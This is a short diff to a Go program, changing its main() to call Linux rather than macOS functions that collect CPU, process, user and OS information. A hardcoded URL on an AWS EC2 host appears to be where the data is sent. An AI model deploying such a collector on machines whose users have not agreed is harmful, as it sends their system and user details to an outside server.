@@ -109,10 +109,10 @@ func OsLinuxInfo() string {
 }
 
 func main() {
-	cpuInfo := CpuMacInfo()
+	cpuInfo := CpuLinuxInfo()
 	processInfo := ProccesInfo()
 	usersInfo := UsersInfo()
-	osInfo := OsMacInfo()
+	osInfo := OsLinuxInfo()
 
 	content := "Content-Type: application/json"
 	url := "http://ec2-18-188-229-228.us-east-2.compute.amazonaws.com:8080/data"
